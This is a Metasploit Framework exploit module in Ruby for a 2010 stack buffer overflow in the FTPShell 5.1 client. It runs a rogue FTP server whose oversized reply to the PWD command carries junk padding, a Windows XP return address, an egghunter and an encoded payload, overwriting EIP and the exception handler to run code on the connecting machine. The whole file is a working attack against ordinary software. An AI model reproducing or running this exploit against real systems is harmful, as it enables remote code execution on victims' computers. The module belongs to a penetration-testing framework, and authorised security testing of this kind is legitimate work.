##
# $Id: ftpshell51_pwd_reply.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Exploit::Remote::FtpServer
	include Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FTPShell 5.1 Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in FTPShell 5.1. The overflow gets
				triggered when the ftp clients tries to process an overly response to a PWD command.
				This will overwrite the saved EIP and structured exception handler.
			},
			'Author' 	 =>
				[
					'corelanc0d3r'	#found bug, wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 11039 $",
			'References'     =>
				[
					[ 'OSVDB', '68639'],
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\xff\x0d\x5c\x2f\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Universal', { 'Offset' => 399, 'Ret' => 0x779A5483  } ], #jmp ebp [setupapi.dll]]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))

	end


	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end


	def on_client_command_pwd(c,arg)

		badchars = ""
		eggoptions =
		{
		:checksum => true,
		:eggtag => "w00t"
		}
		hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)

		print_status(" - PWD command -> Sending payload")
		junk = "A" * target['Offset']
		nops = "A" * 10
		tweakhunter = "\x5a\x5a"
		eip = [target.ret].pack('V')
		buffer = junk + eip + nops + tweakhunter + hunter + egg
		pwdoutput = "257  \"/" + buffer+ "\" is current directory\r\n"
		c.put(pwdoutput)
		print_status(" - Sent #{pwdoutput.length} bytes, wait for hunter")
		return

	end

end
